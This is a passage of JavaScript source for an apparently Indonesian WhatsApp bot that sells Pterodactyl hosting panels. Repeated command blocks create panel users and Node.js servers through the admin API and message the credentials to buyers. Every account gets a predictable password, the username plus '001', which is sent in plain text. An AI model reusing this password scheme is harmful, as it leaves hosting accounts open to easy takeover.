"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})

const ctf = `Hai @${u.split`@`[0]}
Paket Anda Telah Datang 📦
* *Username :* ${user.username}
* *Password :* ${password}
* *Login :* ${global.domain}

*Rules & Catatan Pembelian Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 20 Hari (2x replace)
* Buyer TIDAK Boleh Memasang Script DDos Pada Panel
* Jika Password Salah Maka Ganti 001 menjadi 100800 
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
============== © Xin ==============
`
xin.sendMessage(u, { caption: ctf, image: P1, quoted: qpayment });
let data2 = await f2.json();
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": "if [[ -d .git ]] && [[ \${AUTO_UPDATE} == \"1\" ]]; then git pull; fi; if [[ ! -z \${NODE_PACKAGES} ]]; then /usr/local/bin/npm install \${NODE_PACKAGES}; fi; if [[ ! -z \${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall \${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/\${CMD_RUN}",
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": -1,
"disk": disk,
"io": 10,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return ReplyX(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await ReplyX(`
Successfully Added User + Server To Database Panel!
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)
} catch {
  ReplyX('Error\n Invalid PTLA / PTLC. Silahkan cek kembali')
}
}

break
case '4gb': {
if (!isPrem && !isReseller) return ReplyX(`Fitur Ini Khusus Premium & Reseller`)
let t = text.split(',');
if (t.length < 2) return ReplyX(`*Syntax Error!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location3
let memo = "4110"
let cpu = "120"
let disk = "4110"
let email = username + "@xinner.id"
try {
if (!u) return
let d = (await xin.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return ReplyX(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})

const ctf = `Hai @${u.split`@`[0]}
Paket Anda Telah Datang 📦
* *Username :* ${user.username}
* *Password :* ${password}
* *Login :* ${global.domain}

*Rules & Catatan Pembelian Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 20 Hari (2x replace)
* Buyer TIDAK Boleh Memasang Script DDos Pada Panel
* Jika Password Salah Maka Ganti 001 menjadi 100800 
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
============== © Xin ==============
`
xin.sendMessage(u, { caption: ctf, image: P1 });
let data2 = await f2.json();


let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": "if [[ -d .git ]] && [[ \${AUTO_UPDATE} == \"1\" ]]; then git pull; fi; if [[ ! -z \${NODE_PACKAGES} ]]; then /usr/local/bin/npm install \${NODE_PACKAGES}; fi; if [[ ! -z \${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall \${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/\${CMD_RUN}",
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": -1,
"disk": disk,
"io": 10,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return ReplyX(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await ReplyX(`
Successfully Added User + Server To Database Panel!
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)
} catch {
  ReplyX('Error\n Invalid PTLA / PTLC. Silahkan cek kembali')
}
}

break
case '5gb': {
if (!isPrem && !isReseller) return ReplyX(`Fitur Ini Khusus Premium & Reseller`)
let t = text.split(',');
if (t.length < 2) return ReplyX(`*Syntax Error!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location3
let memo = "5130"
let cpu = "150"
let disk = "5130"
let email = username + "@xinner.id"
try {
if (!u) return
let d = (await xin.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return ReplyX(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})

const ctf = `Hai @${u.split`@`[0]}
Paket Anda Telah Datang 📦
* *Username :* ${user.username}
* *Password :* ${password}
* *Login :* ${global.domain}

*Rules & Catatan Pembelian Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 20 Hari (2x replace)
* Buyer TIDAK Boleh Memasang Script DDos Pada Panel
* Jika Password Salah Maka Ganti 001 menjadi 100800 
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
============== © Xin ==============
`
xin.sendMessage(u, { caption: ctf, image: P1, quoted: qpayment });
let data2 = await f2.json();


let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": "if [[ -d .git ]] && [[ \${AUTO_UPDATE} == \"1\" ]]; then git pull; fi; if [[ ! -z \${NODE_PACKAGES} ]]; then /usr/local/bin/npm install \${NODE_PACKAGES}; fi; if [[ ! -z \${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall \${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/\${CMD_RUN}",
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": -1,
"disk": disk,
"io": 10,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return ReplyX(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await ReplyX(`
Successfully Added User + Server To Database Panel!
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)
} catch {
  ReplyX('Error\n Invalid PTLA / PTLC. Silahkan cek kembali')
}
}

break
case '6gb': {
if (!isPrem && !isReseller) return ReplyX(`Fitur Ini Khusus Premium & Reseller`)
let t = text.split(',');
if (t.length < 2) return ReplyX(`*Syntax Error!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location3
let memo = "6050"
let cpu = "180"
let disk = "6050"
let email = username + "@xinner.id"
try {
if (!u) return
let d = (await xin.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return ReplyX(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})

const ctf = `Hai @${u.split`@`[0]}
Paket Anda Telah Datang 📦
* *Username :* ${user.username}
* *Password :* ${password}
* *Login :* ${global.domain}

*Rules & Catatan Pembelian Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 20 Hari (2x replace)
* Buyer TIDAK Boleh Memasang Script DDos Pada Panel
* Jika Password Salah Maka Ganti 001 menjadi 100800 
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
============== © Xin ==============
`
xin.sendMessage(u, { caption: ctf, image: P1, quoted: qpayment });
let data2 = await f2.json();


let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": "if [[ -d .git ]] && [[ \${AUTO_UPDATE} == \"1\" ]]; then git pull; fi; if [[ ! -z \${NODE_PACKAGES} ]]; then /usr/local/bin/npm install \${NODE_PACKAGES}; fi; if [[ ! -z \${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall \${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/\${CMD_RUN}",
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": -1,
"disk": disk,
"io": 10,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return ReplyX(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await ReplyX(`
Successfully Added User + Server To Database Panel!
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)
} catch {
  ReplyX('Error\n Invalid PTLA / PTLC. Silahkan cek kembali')
}
}

break
case '7gb': {
if (!isPrem && !isReseller) return ReplyX(`Fitur Ini Khusus Premium & Reseller`)
let t = text.split(',');
if (t.length < 2) return ReplyX(`*Syntax Error!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location3
let memo = "7050"
let cpu = "210"
let disk = "7050"
let email = username + "@xinner.id"
try {
if (!u) return
let d = (await xin.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return ReplyX(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})

const ctf = `Hai @${u.split`@`[0]}
Paket Anda Telah Datang 📦
* *Username :* ${user.username}
* *Password :* ${password}
* *Login :* ${global.domain}

*Rules & Catatan Pembelian Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 20 Hari (2x replace)
* Buyer TIDAK Boleh Memasang Script DDos Pada Panel
* Jika Password Salah Maka Ganti 001 menjadi 100800 
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
============== © Xin ==============
`
xin.sendMessage(u, { caption: ctf, image: P1, quoted: qpayment });
let data2 = await f2.json();


let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": "if [[ -d .git ]] && [[ \${AUTO_UPDATE} == \"1\" ]]; then git pull; fi; if [[ ! -z \${NODE_PACKAGES} ]]; then /usr/local/bin/npm install \${NODE_PACKAGES}; fi; if [[ ! -z \${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall \${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/\${CMD_RUN}",
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": -1,
"disk": disk,
"io": 10,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return ReplyX(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await ReplyX(`
Successfully Added User + Server To Database Panel!
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)
} catch {
  ReplyX('Error\n Invalid PTLA / PTLC. Silahkan cek kembali')
}
}

break
case '8gb': {
if (!isPrem && !isReseller) return ReplyX(`Fitur Ini Khusus Premium & Reseller`)
let t = text.split(',');
if (t.length < 2) return ReplyX(`*Syntax Error!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location3
let memo = "8050"
let cpu = "240"
let disk = "8050"
let email = username + "@xinner.id"
try {
if (!u) return
let d = (await xin.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return ReplyX(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})

const ctf = `Hai @${u.split`@`[0]}
Paket Anda Telah Datang 📦
* *Username :* ${user.username}
* *Password :* ${password}
* *Login :* ${global.domain}

*Rules & Catatan Pembelian Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 20 Hari (2x replace)
* Buyer TIDAK Boleh Memasang Script DDos Pada Panel
* Jika Password Salah Maka Ganti 001 menjadi 100800 
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
============== © Xin ==============
`
xin.sendMessage(u, { caption: ctf, image: P1, quoted: qpayment });
let data2 = await f2.json();


let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": "if [[ -d .git ]] && [[ \${AUTO_UPDATE} == \"1\" ]]; then git pull; fi; if [[ ! -z \${NODE_PACKAGES} ]]; then /usr/local/bin/npm install \${NODE_PACKAGES}; fi; if [[ ! -z \${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall \${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/\${CMD_RUN}",
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": -1,
"disk": disk,
"io": 10,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return ReplyX(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await ReplyX(`
Successfully Added User + Server To Database Panel!
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)
} catch {
  ReplyX('Error\n Invalid PTLA / PTLC. Silahkan cek kembali')
}
}

break
case '9gb': {
if (!isPrem && !isReseller) return ReplyX(`Fitur Ini Khusus Premium & Reseller`)
let t = text.split(',');
if (t.length < 2) return ReplyX(`*Syntax Error!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location3
let memo = "9050"
let cpu = "270"
let disk = "9050"
let email = username + "@xinner.id"
try {
if (!u) return
let d = (await xin.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return ReplyX(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})

const ctf = `Hai @${u.split`@`[0]}
Paket Anda Telah Datang 📦
* *Username :* ${user.username}
* *Password :* ${password}
* *Login :* ${global.domain}

*Rules & Catatan Pembelian Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 20 Hari (2x replace)
* Buyer TIDAK Boleh Memasang Script DDos Pada Panel
* Jika Password Salah Maka Ganti 001 menjadi 100800 
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
============== © Xin ==============
`
xin.sendMessage(u, { caption: ctf, image: P1, quoted: qpayment });
let data2 = await f2.json();


let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": "if [[ -d .git ]] && [[ \${AUTO_UPDATE} == \"1\" ]]; then git pull; fi; if [[ ! -z \${NODE_PACKAGES} ]]; then /usr/local/bin/npm install \${NODE_PACKAGES}; fi; if [[ ! -z \${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall \${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/\${CMD_RUN}",
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": -1,
"disk": disk,
"io": 10,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return ReplyX(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await ReplyX(`
Successfully Added User + Server To Database Panel!
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)
} catch {
  ReplyX('Error\n Invalid PTLA / PTLC. Silahkan cek kembali')
}
}

break
case '10gb': {
if (!isPrem && !isReseller) return ReplyX(`Fitur Ini Khusus Premium & Reseller`)
let t = text.split(',');
if (t.length < 2) return newReply(`*Syntax Error!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location3
let memo = "10050"
let cpu = "300"
let disk = "10050"
let email = username + "@xinner.id"
try {
if (!u) return
let d = (await xin.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return ReplyX(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})

const ctf = `Hai @${u.split`@`[0]}
Paket Anda Telah Datang 📦
* *Username :* ${user.username}
* *Password :* ${password}
* *Login :* ${global.domain}

*Rules & Catatan Pembelian Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 20 Hari (2x replace)
* Buyer TIDAK Boleh Memasang Script DDos Pada Panel
* Jika Password Salah Maka Ganti 001 menjadi 100800 
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
============== © Xin ==============
`
xin.sendMessage(u, { caption: ctf, image: P1, quoted: qpayment });
let data2 = await f2.json();


let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": "if [[ -d .git ]] && [[ \${AUTO_UPDATE} == \"1\" ]]; then git pull; fi; if [[ ! -z \${NODE_PACKAGES} ]]; then /usr/local/bin/npm install \${NODE_PACKAGES}; fi; if [[ ! -z \${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall \${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/\${CMD_RUN}",
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": -1,
"disk": disk,
"io": 10,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return ReplyX(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await ReplyX(`
Successfully Added User + Server To Database Panel!
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)
} catch {
  ReplyX('Error\n Invalid PTLA / PTLC. Silahkan cek kembali')
}
}

break
case 'unli': {
if (!isPrem && !isReseller) return ReplyX(`Fitur Ini Khusus Premium & Reseller`)
let t = text.split(',');
if (t.length < 2) return ReplyX(`*Syntax Error!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location3
let memo = "0"
let cpu = "0"
let disk = "0"
let email = username + "@xinner.id"
try {
if (!u) return
let d = (await xin.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return ReplyX(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})

const ctf = `Hai @${u.split`@`[0]}
Paket Anda Telah Datang 📦
* *Username :* ${user.username}
* *Password :* ${password}
* *Login :* ${global.domain}

*Rules & Catatan Pembelian Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 20 Hari (2x replace)
* Buyer TIDAK Boleh Memasang Script DDos Pada Panel
* Jika Password Salah Maka Ganti 001 menjadi 100800 
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian Dan Masuk group ${global.group} Tidak Masuk? Garansi Hangus No Reff !
============== © Xin ==============
`
xin.sendMessage(u, { caption: ctf, image: P1 });
let data2 = await f2.json();


let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": "if [[ -d .git ]] && [[ \${AUTO_UPDATE} == \"1\" ]]; then git pull; fi; if [[ ! -z \${NODE_PACKAGES} ]]; then /usr/local/bin/npm install \${NODE_PACKAGES}; fi; if [[ ! -z \${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall \${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/\${CMD_RUN}",
